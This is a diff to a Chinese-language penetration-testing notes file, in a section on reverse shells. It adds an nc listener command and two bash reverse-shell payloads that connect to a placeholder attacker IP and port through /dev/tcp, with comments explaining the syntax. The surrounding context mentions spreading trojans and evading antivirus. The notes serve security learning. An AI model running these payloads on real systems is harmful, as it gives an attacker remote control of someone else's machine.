@@ -156,15 +156,27 @@ touch -r <oldFile> <newFile> # 可以将`oldFile`和`newFile`时间戳同步，�
 - 向局域网中的主机散播木马病毒等，网络环境未知的情况下
 - 服务端的AV对正向连接的流量检测非常严格，但是对出网流量校验不足
 #### 过程
-不同的操作系统可能不太一样
+
+> 不同的操作系统可能不太一样
+> 在不同的反弹shell方式中，都需要攻击者（客户端）进行监听，下文将不再赘述，仅讲述不同的反弹方式
+> 需要目标机触发payload造成反弹shell
 
 ```sh
 # 客户端监听端口
 nc -l 9999
 
 # Netcat 是 Linux 系统下常用的网络工具，当然也有Windows版本，在 Linux 下使用命令 `nc`，前面的端口监听就是使用 Netcat
+
+# payload1 
+bash -i >& /dev/tcp/Your_IP/Your_Port 0>&1 
+# payload2 
+bash -c "bash -i >& /dev/tcp/Your_IP/Your_Port 0>&1"
+
+#`/dev/tcp` is a virtual device file in Unix-like systems that allows programs to access TCP/IP sockets as if they were regular files. 
+#`>&` is a Bash operator used for redirecting output and input. 
+#`0>&1` redirects standard input (0) to standard output (1).
+
 ```
-> 在不同的反弹shell方式中，都需要客户端监听，下文将不再赘述，仅讲述不同的反弹方式
 
 
 
